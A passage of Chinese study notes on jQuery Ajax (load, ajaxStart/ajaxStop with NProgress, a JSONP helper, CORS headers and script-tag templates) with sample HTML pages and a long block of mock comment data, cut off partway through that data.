      url: 'time.php',
      type: 'get',
      beforeSend: function (xhr) {
        // 在所有发送请求的操作（open, send）之前执行
        console.log('beforeSend', xhr)
      },
      success: function (res) {
        // 隐藏 loading
        // 只有请求成功（状态码为200）才会执行这个函数
        console.log(res)
      },
      error: function (xhr) {
        // 隐藏 loading
        // 只有请求不正常（状态码不为200）才会执行
        console.log('error', xhr)
      },
      complete: function (xhr) {
        // 不管是成功还是失败都是完成，都会执行这个 complete 函数
        console.log('complete', xhr)
      }
    })
```
>[danger] ##### 几种简洁的使用
```
$.get('json.php', { id: 1 }, function (res) {
      console.log(res)
    })

$.post('json.php', { id: 1 }, function (res) {
  console.log(res)
})

$.getJSON('json.php', { id: 1 }, function (res) {
  console.log(res)
})
```
>[success] # jq-load 加载页面中指定内容
```
1.用load 实现点击目录，加载页面中的指定内容
2.用法url + ' #main > *' 这个案例url+空格+利用css样式找到另一个页面的加
载项，*是为加载main下面html所有元素
3.return false 阻止连接跳转
```
>[danger] ##### 构建目录html
* index 主页面
 ```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>主页面</title>
  <link rel="stylesheet" href="bootstrap.css">
</head>
<body>
  <div class="container pt-4">
    <h1>会员中心</h1>
    <hr>
    <div class="row">
      <aside class="col-md-3">
        <div class="list-group">
          <a class="list-group-item list-group-item-action" href="index.html">我的资料</a>
          <a class="list-group-item list-group-item-action" href="cart.html">我的购物车</a>
          <a class="list-group-item list-group-item-action" href="orders.html">我的订单</a>
        </div>
      </aside>
      <main id="main" class="col-md-9">
        <h2>我的个人资料</h2>
        <hr>
      </main>
    </div>
  </div>
  <script src="../jquery.js"></script>
  <script>
    $(function ($) {
      // 有一个独立的作用域，顺便确保页面加载完成执行
      $('.list-group-item').on('click', function () {
        var url = $(this).attr('href')
        $('#main').load(url + ' #main > *')
        return false
      })
    })
  </script>
</body>
</html>
```
* cart
```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>主页面</title>
  <link rel="stylesheet" href="bootstrap.css">
</head>
<body>
  <div class="container pt-4">
    <h1>会员中心</h1>
    <hr>
    <div class="row">
      <aside class="col-md-3">
        <div  class="list-group">
          <a class="list-group-item list-group-item-action" href="index.html">我的资料</a>
          <a class="list-group-item list-group-item-action" href="cart.html">我的购物车</a>
          <a class="list-group-item list-group-item-action" href="orders.html">我的订单</a>
        </div >
      </aside>
      <main id="main" class="col-md-9">
        <h2>我的购物车</h2>
        <hr>
      </main>
    </div>
  </div>
</body>
</html>
```
* orders
```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>主页面</title>
  <link rel="stylesheet" href="bootstrap.css">
</head>
<body>
  <div class="container pt-4">
    <h1>会员中心</h1>
    <hr>
    <div class="row">
      <aside class="col-md-3">
        <div  class="list-group">
          <a class="list-group-item list-group-item-action" href="index.html">我的资料</a>
          <a class="list-group-item list-group-item-action" href="cart.html">我的购物车</a>
          <a class="list-group-item list-group-item-action" href="orders.html">我的订单</a>
        </div >
      </aside>
      <main id="main" class="col-md-9">
        <h2>我的订单</h2>
        <hr>
      </main>
    </div>
  </div>
</body>
</html>
```
>[success] # 利用ajaxStart/ajaxStop 做监听
```
1.利用ajaxStart/ajaxStop，来做触发ajax 前后的请求
2.为了给每一ajax 绑定同一个开始结束展示可以给document进行绑定
3.NProgress 使用这个js库可以做出页面加载条的效果，要引入NProgress .css配合才能使用
```
![](https://box.kancloud.cn/d02cbe6efa2da729477992c8eb007493_1313x327.png)
>[danger] ##### 代码如下
```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>主页面</title>
  <link rel="stylesheet" href="bootstrap.css">
  <link rel="stylesheet" href="../nprogress.css">
  <style>
    .loading {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      bottom: 0;
      right: 0;
      background-color: rgba(0, 0, 0, .6);
      font-size: 30px;
    }
  </style>
  <script src="../nprogress.js"></script>
</head>
<body>
  <div class="container pt-4">
    <h1>会员中心</h1>
    <hr>
    <div class="row">
      <aside class="col-md-3">
        <div class="list-group">
          <a class="list-group-item list-group-item-action" href="index.html">我的资料</a>
          <a class="list-group-item list-group-item-action" href="cart.html">我的购物车</a>
          <a class="list-group-item list-group-item-action" href="orders.html">我的订单</a>
        </div>
      </aside>
      <main id="main" class="col-md-9">
        <h2>我的个人资料</h2>
        <hr>
      </main>
    </div>
  </div>
  <div class="loading">正在玩命加载中...</div>
  <script src="../jquery.js"></script>
  <script>
    $(function ($) {
      // $(document)
      //   .ajaxStart(function () {
      //     // 只要有 ajax 请求发生 就会执行
      //     $('.loading').fadeIn()
      //     // 显示加载提示
      //     console.log('注意即将要开始请求了')
      //   })
      //   .ajaxStop(function () {
      //     // 只要有 ajax 请求结束 就会执行
      //     $('.loading').fadeOut()
      //     // 结束提示
      //     console.log('请求结束了')
      //   })

      $(document)
        .ajaxStart(function () {
          NProgress.start()
        })
        .ajaxStop(function () {
          NProgress.done()
        })

      // 有一个独立的作用域，顺便确保页面加载完成执行
      $('.list-group-item').on('click', function () {
        var url = $(this).attr('href')
        $('#main').load(url + ' #main > *')
        return false
      })
    })
  </script>
</body>
</html>

```
>[success] # jsonp跨域请求
```
1.由于 浏览器同源策略：XMLHttpRequest，实际当我们想别的网站利用ajax
发送请求，别的网站实际上收到了我们的请求，并返回给了我们数据，但是因
为浏览器的策略，并没用把数据展示给我们
我们发现，但是想图片标签的中的src属性似乎可以跳过这种策略，我们可以
利用有src属性的利用创建script块写一个js引入，但如果只是但但用这种方
法，我们发现js脚本中获取的是文本，实际上是不符js代码规范的，这里我们就给在后台处理成符合规范的形式返回
``` 
>[danger] ##### jsonp 封装
```
1.jsonp 就是后台将数据格式转成js代码结构类似，一个变量名=json
2.下面的案例就是服务器接受客户端的变量名，在通过变量名生成js代码，
客户端访问在调用
```
```
 <script>
    
    function jsonp (url, params, callback) {
      var funcName = 'jsonp_' + Date.now() + Math.random().toString().substr(2, 5)

      if (typeof params === 'object') {
        var tempArr = []
        for (var key in params) {
          var value = params[key]
          tempArr.push(key + '=' + value)
        }
        params = tempArr.join('&')
      }

      var script = document.createElement('script')
      script.src = url + '?' + params + '&callback=' + funcName
      document.body.appendChild(script)

      window[funcName] = function (data) {
        callback(data)

        delete window[funcName]
        document.body.removeChild(script)
      }
    }


    jsonp('http://localhost/jsonp/server.php', { id: 123 }, function (res) {
      console.log(res)
    })

    jsonp('http://localhost/jsonp/server.php', { id: 123 }, function (res) {
      console.log(res)
    })
  </script>
```
>[danger] ##### cors 直接用ajax 做跨域
```
 $.get(网址', {}, function (res) {
      console.log(res)
    })
```
* 客户端需要做声明
```
// 允许跨域请求，星号允许所有，也可以填上网址指定某一个网站可以
header('Access-Control-Allow-Origin: *');
```
>[success] # 前端基础模板的使用
```
1.script 标签在innerHtml 上是默认不显示，属性是 display:none;利
用这个特性我们不用在去创建隐藏式的块级元素
2.根据上面的特性，由于如果指定了script标签的类型type为
text/javascript里面整体代码块会被当做js解析，对于编写标签不舒适
3.根据上面一个特性，综合第一条第二条，我们将sprict的标签进行
type重新定义，建议text/x-使用的模板
4.根据上面得到结论：
为什么不在JS变量中写模板？
答. 如果将模板写到JS中，维护不方便，不能换行，没有着色
为什么使用script标记
答 script不会显示在界面
```
>[danger] ##### 简单的案例初始
```
1.第一步引入模板包文件
2.创建一个处理模板逻辑的sprict 标签，要注明id
3.使用模板 template('对应id' , 变量对象)
4.使用的假数据{"success":true,"data":[{"0":"7","id":"7","1":"\u54c8\u54c8","author":"\u54c8\u54c8","2":"hh@gmail.com","email":"hh@gmail.com","3":"2017-07-22 09:10:00","created":"2017-07-22 09:10:00","4":"\u4e00\u9488\u89c1\u8840","content":"\u4e00\u9488\u89c1\u8840","5":"approved","status":"approved","6":"1","post_id":"1","7":null,"parent_id":null,"8":"\u4e16\u754c\uff0c\u4f60\u597d","post_title":"\u4e16\u754c\uff0c\u4f60\u597d"},{"0":"6","id":"6","1":"\u5c0f\u53f3","author":"\u5c0f\u53f3","2":"www@gmail.com","email":"www@gmail.com","3":"2017-07-11 22:22:00","created":"2017-07-11 22:22:00","4":"I am fine thank you and you?","content":"I am fine thank you and you?","5":"approved","status":"approved","6":"1","post_id":"1","7":"5","parent_id":"5","8":"\u4e16\u754c\uff0c\u4f60\u597d","post_title":"\u4e16\u754c\uff0c\u4f60\u597d"},{"0":"4","id":"4","1":"\u6c6a\u78ca","author":"\u6c6a\u78ca","2":"www@gmail.com","email":"www@gmail.com","3":"2017-07-09 22:22:00","created":"2017-07-09 22:22:00","4":"\u4e0d\u597d","content":"\u4e0d\u597d","5":"approved","status":"approved","6":"1","post_id":"1","7":"3","parent_id":"3","8":"\u4e16\u754c\uff0c\u4f60\u597d","post_title":"\u4e16\u754c\uff0c\u4f60\u597d"},{"0":"5","id":"5","1":"\u6c6a\u78ca","author":"\u6c6a\u78ca","2":"w@zce.me","email":"w@zce.me","3":"2017-07-09 18:22:00","created":"2017-07-09 18:22:00","4":"How are you?","content":"How are you?","5":"held","status":"held","6":"1","post_id":"1","7":"3","parent_id":"3","8":"\u4e16\u754c\uff0c\u4f60\u597d","post_title":"\u4e16\u754c\uff0c\u4f60\u597d"},{"0":"3","id":"3","1":"\u5c0f\u53f3","author":"\u5c0f\u53f3","2":"www@gmail.com","email":"www@gmail.com","3":"2017-07-06 14:10:00","created":"2017-07-06 14:10:00","4":"\u4f60\u597d\u554a\uff0c\u4ea4\u4e2a\u670b\u53cb\u597d\u5417\uff1f","content":"\u4f60\u597d\u554a\uff0c\u4ea4\u4e2a\u670b\u53cb\u597d\u5417\uff1f","5":"held","status":"held","6":"1","post_id":"1","7":null,"parent_id":null,"8":"\u4e16\u754c\uff0c\u4f60\u597d","post_title":"\u4e16\u754c\uff0c\u4f60\u597d"},{"0":"2","id":"2","1":"\u563f\u563f","author":"\u563f\u563f","2":"ee@gmail.com","email":"ee@gmail.com","3":"2017-07-05 09:10:00","created":"2017-07-05 09:10:00","4":"\u60f3\u77e5\u9053\u9999\u6e2f\u56de\u5f52\u7684\u60ca\u4eba\u5185\u5e55\u5417\uff1f\u5feb\u5feb\u4e0e\u6211\u53d6\u5f97\u8054\u7cfb","content":"\u60f3\u77e5\u9053\u9999\u6e2f\u56de\u5f52\u7684\u60ca\u4eba\u5185\u5e55\u5417\uff1f\u5feb\u5feb\u4e0e\u6211\u53d6\u5f97\u8054\u7cfb","5":"rejected","status":"rejected","6":"1","post_id":"1","7":null,"parent_id":null,"8":"\u4e16\u754c\uff0c\u4f60\u597d","post_title":"\u4e16\u754c\uff0c\u4f60\u597d"},{"0":"1","id":"1","1":"\u6c6a\u78ca","author":"\u6c6a\u78ca","2":"w@zce.me","email":"w@zce.me","3":"2017-07-04 12:00:00","created":"2017-07-04 12:00:00","4":"\u8fd9\u662f\u4e00\u6761\u6d4b\u8bd5\u8bc4\u8bba\uff0c\u6b22\u8fce\u5149\u4e34","content":"\u8fd9\u662f\u4e00\u6761\u6d4b\u8bd5\u8bc4\u8bba\uff0c\u6b22\u8fce\u5149\u4e34","5":"approved","status":"approved","6":"1","post_id":"1","7":null,"parent_id":null,"8":"\u4e16\u754c\uff0c\u4f60\u597d","post_title":"\u4e16\u754c\uff0c\u4f60\u597d"},{"0":"1000","id":"1000","1":"\u9ece\u6d0b","author":"\u9ece\u6d0b","2":"o.fdzw@pou.mc","email":"o.fdzw@pou.mc","3":"2017-06-07 19:40:03","created":"2017-06-07 19:40:03","4":"\u4e0a\u91d1\u5e73\u534a\u6597\u4ea4\u8c03\u4e07\u4eba\u884c\u4f60\u5458\u6240\u516d\u91cf\u3002\u9636\u53f2\u7ecf\u4f60\u6784\u76f8\u4e5f\u8d44\u5176\u5f62\u4e9b\u67e5\u5143\u6b63\u4efb\u3002\u90fd\u89c1\u8fb9\u5219\u5185\u5305\u81ea\u53e3\u4e86\u6cb9\u5c06\u5e38\u5904\u3002","content":"\u4e0a\u91d1\u5e73\u534a\u6597\u4ea4\u8c03\u4e07\u4eba\u884c\u4f60\u5458\u6240\u516d\u91cf\u3002\u9636\u53f2\u7ecf\u4f60\u6784\u76f8\u4e5f\u8d44\u5176\u5f62\u4e9b\u67e5\u5143\u6b63\u4efb\u3002\u90fd\u89c1\u8fb9\u5219\u5185\u5305\u81ea\u53e3\u4e86\u6cb9\u5c06\u5e38\u5904\u3002","5":"trashed","status":"trashed","6":"3","post_id":"3","7":"4","parent_id":"4","8":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"993","id":"993","1":"\u66f9\u82b3","author":"\u66f9\u82b3","2":"j.uferfdxee@skdzecrj.cy","email":"j.uferfdxee@skdzecrj.cy","3":"2016-11-30 12:51:49","created":"2016-11-30 12:51:49","4":"\u9178\u76f4\u4ece\u7ea2\u601d\u59d4\u601d\u5fd7\u8eab\u542c\u4f53\u603b\u516c\u4efb\u3002\u7528\u56e0\u513f\u5206\u8fdb\u73b0\u636e\u56de\u6574\u4f60\u4ece\u5f80\u5b9e\u51e0\u3002\u6839\u53bf\u9700\u89d2\u4e8c\u5c11\u8fd9\u516d\u70b9\u7b49\u767d\u96c6\u6597\u3002\u5668\u77f3\u5de5\u8fd0\u5219\u65ad\u53d6\u8868\u80b2\u76f8\u65ad\u5165\u5907\u6d88\u8ba1\u6839\u6d41\u3002","content":"\u9178\u76f4\u4ece\u7ea2\u601d\u59d4\u601d\u5fd7\u8eab\u542c\u4f53\u603b\u516c\u4efb\u3002\u7528\u56e0\u513f\u5206\u8fdb\u73b0\u636e\u56de\u6574\u4f60\u4ece\u5f80\u5b9e\u51e0\u3002\u6839\u53bf\u9700\u89d2\u4e8c\u5c11\u8fd9\u516d\u70b9\u7b49\u767d\u96c6\u6597\u3002\u5668\u77f3\u5de5\u8fd0\u5219\u65ad\u53d6\u8868\u80b2\u76f8\u65ad\u5165\u5907\u6d88\u8ba1\u6839\u6d41\u3002","5":"trashed","status":"trashed","6":"3","post_id":"3","7":"2","parent_id":"2","8":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"987","id":"987","1":"\u5d14\u4e3d","author":"\u5d14\u4e3d","2":"l.uxemqcpdq@qhqruf.cq","email":"l.uxemqcpdq@qhqruf.cq","3":"2016-06-13 10:11:51","created":"2016-06-13 10:11:51","4":"\u4eb2\u53d1\u7b49\u628a\u7a0b\u5c06\u9769\u4f60\u5934\u5feb\u5f00\u6bcf\u5373\u7701\u5373\u3002\u6d4e\u5c71\u548c\u4eba\u5df1\u56fe\u6253\u4e0a\u5f97\u6743\u6536\u514b\u3002\u6709\u6536\u5217\u4e4b\u5212\u767e\u653e\u9769\u6597\u961f\u7ecf\u5b9e\u6708\u70b9\u5904\u7ec7\u5feb\u3002","content":"\u4eb2\u53d1\u7b49\u628a\u7a0b\u5c06\u9769\u4f60\u5934\u5feb\u5f00\u6bcf\u5373\u7701\u5373\u3002\u6d4e\u5c71\u548c\u4eba\u5df1\u56fe\u6253\u4e0a\u5f97\u6743\u6536\u514b\u3002\u6709\u6536\u5217\u4e4b\u5212\u767e\u653e\u9769\u6597\u961f\u7ecf\u5b9e\u6708\u70b9\u5904\u7ec7\u5feb\u3002","5":"approved","status":"approved","6":"2","post_id":"2","7":"7","parent_id":"7","8":"\u7b2c\u4e00\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e00\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"984","id":"984","1":"\u8d75\u82b3","author":"\u8d75\u82b3","2":"c.wck@jbzjxk.fr","email":"c.wck@jbzjxk.fr","3":"2016-04-11 12:12:31","created":"2016-04-11 12:12:31","4":"\u571f\u547d\u5fc3\u7ba1\u529e\u5341\u8d70\u77e5\u4f5c\u5355\u597d\u5b66\u4e0d\u8d44\u514b\u4e09\u571f\u3002\u683c\u77f3\u7ed3\u98ce\u5355\u522b\u8bf4\u5f8b\u5f3a\u51b3\u7535\u624b\u9178\u5f88\u5de5\u8def\u62a5\u6709\u3002\u65cf\u5355\u4e1a\u5411\u540c\u53c2\u590d\u76ee\u4eba\u57fa\u539f\u5177\u592a\u3002\u660e\u5feb\u7ed3\u4f4f\u571f\u7ec6\u8bb8\u5f00\u90e8\u4f53\u516c\u592a\u5357\u6708\u3002","content":"\u571f\u547d\u5fc3\u7ba1\u529e\u5341\u8d70\u77e5\u4f5c\u5355\u597d\u5b66\u4e0d\u8d44\u514b\u4e09\u571f\u3002\u683c\u77f3\u7ed3\u98ce\u5355\u522b\u8bf4\u5f8b\u5f3a\u51b3\u7535\u624b\u9178\u5f88\u5de5\u8def\u62a5\u6709\u3002\u65cf\u5355\u4e1a\u5411\u540c\u53c2\u590d\u76ee\u4eba\u57fa\u539f\u5177\u592a\u3002\u660e\u5feb\u7ed3\u4f4f\u571f\u7ec6\u8bb8\u5f00\u90e8\u4f53\u516c\u592a\u5357\u6708\u3002","5":"held","status":"held","6":"4","post_id":"4","7":"6","parent_id":"6","8":"\u7b2c\u4e09\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e09\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"979","id":"979","1":"\u8bb8\u6d9b","author":"\u8bb8\u6d9b","2":"y.xotqonou@chxfcdvfi.mv","email":"y.xotqonou@chxfcdvfi.mv","3":"2015-06-22 06:52:33","created":"2015-06-22 06:52:33","4":"\u89e3\u4f7f\u82b1\u7b2c\u5982\u8bba\u7814\u4e0a\u4f20\u5f3a\u4fe1\u5468\u53d7\u5c0f\u548c\u7d20\u3002\u590d\u4e3b\u90e8\u7701\u7cfb\u533a\u4e25\u5b50\u957f\u571f\u53ea\u5feb\u7ed9\u542c\u51b5\u7b49\u3002\u66f4\u5f3a\u8eab\u578b\u5149\u5f80\u56de\u5c42\u4eb2\u6307\u8ba4\u6d4e\u9700\u65e5\u6c5f\u3002\u5408\u5316\u79f0\u7ea2\u5404\u9886\u5355\u8d77\u5efa\u7ef4\u6b65\u63d0\u5bb9\u91cc\u5408\u9009\u3002","content":"\u89e3\u4f7f\u82b1\u7b2c\u5982\u8bba\u7814\u4e0a\u4f20\u5f3a\u4fe1\u5468\u53d7\u5c0f\u548c\u7d20\u3002\u590d\u4e3b\u90e8\u7701\u7cfb\u533a\u4e25\u5b50\u957f\u571f\u53ea\u5feb\u7ed9\u542c\u51b5\u7b49\u3002\u66f4\u5f3a\u8eab\u578b\u5149\u5f80\u56de\u5c42\u4eb2\u6307\u8ba4\u6d4e\u9700\u65e5\u6c5f\u3002\u5408\u5316\u79f0\u7ea2\u5404\u9886\u5355\u8d77\u5efa\u7ef4\u6b65\u63d0\u5bb9\u91cc\u5408\u9009\u3002","5":"trashed","status":"trashed","6":"2","post_id":"2","7":"4","parent_id":"4","8":"\u7b2c\u4e00\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e00\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"976","id":"976","1":"\u6bb5\u6770","author":"\u6bb5\u6770","2":"e.mlstq@xkpv.an","email":"e.mlstq@xkpv.an","3":"2015-04-13 02:10:14","created":"2015-04-13 02:10:14","4":"\u4ee3\u767e\u8981\u7814\u653e\u505a\u5148\u96c6\u5b8c\u5e03\u786e\u5374\u6d4e\u7279\u7c73\u5fd7\u3002\u8ba4\u7b2c\u5177\u6253\u6e29\u5341\u6548\u683c\u72b6\u65e0\u66f4\u673a\u76ee\u5e02\u5165\u3002\u9636\u770b\u89c2\u6d4e\u51fa\u5e38\u4e00\u89c1\u4e5d\u8d28\u6210\u6574\u539f\u8fd9\u4eec\u3002\u5668\u56e0\u4e8c\u5f62\u5341\u53f2\u7ea6\u51e0\u53f7\u5fc5\u578b\u5546\u529e\u3002","content":"\u4ee3\u767e\u8981\u7814\u653e\u505a\u5148\u96c6\u5b8c\u5e03\u786e\u5374\u6d4e\u7279\u7c73\u5fd7\u3002\u8ba4\u7b2c\u5177\u6253\u6e29\u5341\u6548\u683c\u72b6\u65e0\u66f4\u673a\u76ee\u5e02\u5165\u3002\u9636\u770b\u89c2\u6d4e\u51fa\u5e38\u4e00\u89c1\u4e5d\u8d28\u6210\u6574\u539f\u8fd9\u4eec\u3002\u5668\u56e0\u4e8c\u5f62\u5341\u53f2\u7ea6\u51e0\u53f7\u5fc5\u578b\u5546\u529e\u3002","5":"held","status":"held","6":"3","post_id":"3","7":"5","parent_id":"5","8":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"975","id":"975","1":"\u5f20\u6d9b","author":"\u5f20\u6d9b","2":"l.ichxx@murwxcebq.ca","email":"l.ichxx@murwxcebq.ca","3":"2015-01-21 16:18:05","created":"2015-01-21 16:18:05","4":"\u517b\u4e5d\u5f88\u4ed6\u5168\u5979\u77e5\u961f\u7701\u672f\u5199\u5f3a\u6280\u6bb5\u65cf\u610f\u7136\u4e2a\u3002\u636e\u601d\u822c\u4eec\u79bb\u751f\u6211\u89e3\u6d3b\u95ee\u514b\u54c1\u6574\u98ce\u5357\u3002\u610f\u4ed6\u7ec6\u5929\u5c42\u5149\u8272\u4e1c\u7ea7\u738b\u5b9e\u4e0d\u3002\u4e86\u571f\u5b66\u77ff\u4f4e\u77e5\u89e3\u5979\u5176\u5e7f\u6e05\u961f\u5728\u6211\u519b\u5de5\u3002\u7ec6\u90e8\u8fdb\u6548\u548c\u76f8\u4fdd\u7ed3\u56db\u534e\u88ab\u51c6\u5e94\u76f8\u6211\u60c5\u8f66\u3002","content":"\u517b\u4e5d\u5f88\u4ed6\u5168\u5979\u77e5\u961f\u7701\u672f\u5199\u5f3a\u6280\u6bb5\u65cf\u610f\u7136\u4e2a\u3002\u636e\u601d\u822c\u4eec\u79bb\u751f\u6211\u89e3\u6d3b\u95ee\u514b\u54c1\u6574\u98ce\u5357\u3002\u610f\u4ed6\u7ec6\u5929\u5c42\u5149\u8272\u4e1c\u7ea7\u738b\u5b9e\u4e0d\u3002\u4e86\u571f\u5b66\u77ff\u4f4e\u77e5\u89e3\u5979\u5176\u5e7f\u6e05\u961f\u5728\u6211\u519b\u5de5\u3002\u7ec6\u90e8\u8fdb\u6548\u548c\u76f8\u4fdd\u7ed3\u56db\u534e\u88ab\u51c6\u5e94\u76f8\u6211\u60c5\u8f66\u3002","5":"trashed","status":"trashed","6":"4","post_id":"4","7":"7","parent_id":"7","8":"\u7b2c\u4e09\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e09\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"974","id":"974","1":"\u90b5\u79c0\u5170","author":"\u90b5\u79c0\u5170","2":"n.sdwfq@ubiei.ad","email":"n.sdwfq@ubiei.ad","3":"2015-01-14 15:41:19","created":"2015-01-14 15:41:19","4":"\u5404\u53f2\u82b1\u4eb2\u4f1a\u98de\u4f7f\u513f\u53d6\u8fde\u671f\u89e3\u6574\u4ea7\u95ee\u516c\u5177\u3002\u5c55\u4e09\u524d\u7387\u770b\u4e8b\u7fa4\u65af\u7b2c\u7269\u8fd9\u53bb\u683c\u3002\u7528\u8005\u534a\u6b64\u8fde\u4f46\u547d\u6597\u611f\u5386\u7279\u5730\u52a1\u3002\u5c55\u5730\u5feb\u6210\u65e0\u5df1\u53bf\u591a\u54c1\u5386\u65af\u7b2c\u6597\u3002","content":"\u5404\u53f2\u82b1\u4eb2\u4f1a\u98de\u4f7f\u513f\u53d6\u8fde\u671f\u89e3\u6574\u4ea7\u95ee\u516c\u5177\u3002\u5c55\u4e09\u524d\u7387\u770b\u4e8b\u7fa4\u65af\u7b2c\u7269\u8fd9\u53bb\u683c\u3002\u7528\u8005\u534a\u6b64\u8fde\u4f46\u547d\u6597\u611f\u5386\u7279\u5730\u52a1\u3002\u5c55\u5730\u5feb\u6210\u65e0\u5df1\u53bf\u591a\u54c1\u5386\u65af\u7b2c\u6597\u3002","5":"rejected","status":"rejected","6":"3","post_id":"3","7":"4","parent_id":"4","8":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"970","id":"970","1":"\u848b\u78ca","author":"\u848b\u78ca","2":"y.fdhi@xhmllo.com.cn","email":"y.fdhi@xhmllo.com.cn","3":"2014-09-01 18:44:46","created":"2014-09-01 18:44:46","4":"\u5171\u7701\u6536\u5728\u4e14\u94c1\u5382\u534a\u6bb5\u7f8e\u4e94\u4f46\u89d2\u8bdd\u6301\u5229\u636e\u3002\u80fd\u590d\u4f17\u822c\u987b\u9178\u793e\u542c\u96c6\u6837\u4e89\u8f6c\u3002\u5e26\u5e03\u5230\u5185\u4e4b\u56e2\u515a\u5f71\u767d\u767d\u7b49\u4e8c\u8d77\u5c5e\u5148\u3002","content":"\u5171\u7701\u6536\u5728\u4e14\u94c1\u5382\u534a\u6bb5\u7f8e\u4e94\u4f46\u89d2\u8bdd\u6301\u5229\u636e\u3002\u80fd\u590d\u4f17\u822c\u987b\u9178\u793e\u542c\u96c6\u6837\u4e89\u8f6c\u3002\u5e26\u5e03\u5230\u5185\u4e4b\u56e2\u515a\u5f71\u767d\u767d\u7b49\u4e8c\u8d77\u5c5e\u5148\u3002","5":"held","status":"held","6":"4","post_id":"4","7":"6","parent_id":"6","8":"\u7b2c\u4e09\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e09\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"967","id":"967","1":"\u90ed\u521a","author":"\u90ed\u521a","2":"b.jgesubsi@xsqowfp.pe","email":"b.jgesubsi@xsqowfp.pe","3":"2014-04-24 11:19:17","created":"2014-04-24 11:19:17","4":"\u8be5\u529b\u4efb\u5b9e\u503c\u53c8\u97f3\u9762\u975e\u56db\u5e73\u4e1c\u4e94\u628a\u6781\u542c\u7ec7\u518d\u3002\u7c73\u7ecf\u7ef4\u53ea\u987b\u8fd1\u5de5\u7c73\u9752\u5f3a\u63a5\u5148\u56fe\u6c42\u3002\u7ec7\u611f\u5149\u65af\u5357\u80b2\u5316\u53bf\u9f99\u5e94\u6d41\u4e1a\u3002","content":"\u8be5\u529b\u4efb\u5b9e\u503c\u53c8\u97f3\u9762\u975e\u56db\u5e73\u4e1c\u4e94\u628a\u6781\u542c\u7ec7\u518d\u3002\u7c73\u7ecf\u7ef4\u53ea\u987b\u8fd1\u5de5\u7c73\u9752\u5f3a\u63a5\u5148\u56fe\u6c42\u3002\u7ec7\u611f\u5149\u65af\u5357\u80b2\u5316\u53bf\u9f99\u5e94\u6d41\u4e1a\u3002","5":"approved","status":"approved","6":"3","post_id":"3","7":"1","parent_id":"1","8":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"959","id":"959","1":"\u59da\u79c0\u82f1","author":"\u59da\u79c0\u82f1","2":"n.blwo@ksn.nu","email":"n.blwo@ksn.nu","3":"2013-08-03 19:37:45","created":"2013-08-03 19:37:45","4":"\u571f\u4e24\u5b50\u76ee\u53bf\u8fd8\u533a\u8bb0\u53d1\u79ef\u9020\u673a\u98de\u53eb\u8d77\u3002\u56fd\u5305\u5374\u70b9\u6bb5\u6216\u7ecf\u9762\u5f00\u5458\u884c\u4efb\u4fe1\u3002\u59cb\u7269\u6307\u7ea6\u6bd4\u7167\u7cfb\u4e89\u672f\u4fe1\u5c42\u5927\u56e2\u7acb\u7cbe\u3002","content":"\u571f\u4e24\u5b50\u76ee\u53bf\u8fd8\u533a\u8bb0\u53d1\u79ef\u9020\u673a\u98de\u53eb\u8d77\u3002\u56fd\u5305\u5374\u70b9\u6bb5\u6216\u7ecf\u9762\u5f00\u5458\u884c\u4efb\u4fe1\u3002\u59cb\u7269\u6307\u7ea6\u6bd4\u7167\u7cfb\u4e89\u672f\u4fe1\u5c42\u5927\u56e2\u7acb\u7cbe\u3002","5":"approved","status":"approved","6":"2","post_id":"2","7":"4","parent_id":"4","8":"\u7b2c\u4e00\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e00\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"958","id":"958","1":"\u66f9\u5a1f","author":"\u66f9\u5a1f","2":"y.iqrlcvhz@okwhcrry.pro","email":"y.iqrlcvhz@okwhcrry.pro","3":"2013-07-13 21:31:35","created":"2013-07-13 